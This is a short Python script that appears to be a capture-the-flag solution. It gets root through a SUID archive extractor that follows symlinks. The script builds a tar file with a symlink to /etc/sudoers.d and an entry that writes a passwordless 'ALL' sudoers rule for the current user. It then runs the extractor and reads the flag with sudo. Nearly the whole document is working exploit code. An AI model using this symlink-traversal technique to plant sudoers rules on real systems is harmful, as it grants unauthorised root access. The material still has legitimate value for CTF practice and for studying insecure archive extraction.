#!/usr/bin/env python3
#
#  Solution
#  --------
#  1. The SUID binary does not take symlinks into account
#  2. Extract a new SUDOERS file via a symlink - one entry is a symlink from "dir" to "/etc/sudoers.d" and the other is an entry "dir/ctfpwn"
#
import getpass
import io
import os
import subprocess
import tarfile

# Constants
ARCHIVE = 'exploittar'
USER = getpass.getuser()
SUDOERS_LINE = f'{USER} ALL=(ALL) NOPASSWD: ALL\n'.encode()

# Build archive
with tarfile.open(ARCHIVE, 'w') as tar:

    # Symlink entry to /etc/sudoers.d
    sym = tarfile.TarInfo(name='dir')
    sym.type = tarfile.SYMTYPE
    sym.linkname = '/etc/sudoers.d'
    sym.mode = 0o777
    tar.addfile(sym)

    # Sudoers file entry
    fi = tarfile.TarInfo(name='dir/ctfpwn')
    fi.type = tarfile.REGTYPE
    fi.size = len(SUDOERS_LINE)
    fi.mode = 0o440
    tar.addfile(fi, io.BytesIO(SUDOERS_LINE))

# Run the extractor
r = subprocess.run([ '/Users/ctf/extractor', os.path.abspath(ARCHIVE) ], capture_output=True, text=True)
assert r.returncode == 0, Exception('Error running extractor')

# Simply read the flag
flag = subprocess.run([ 'sudo', 'cat', '/Users/ctf/flag' ], capture_output=True, text=True)
assert flag.returncode == 0, Exception('Error running sudo')
print(flag.stdout.strip())

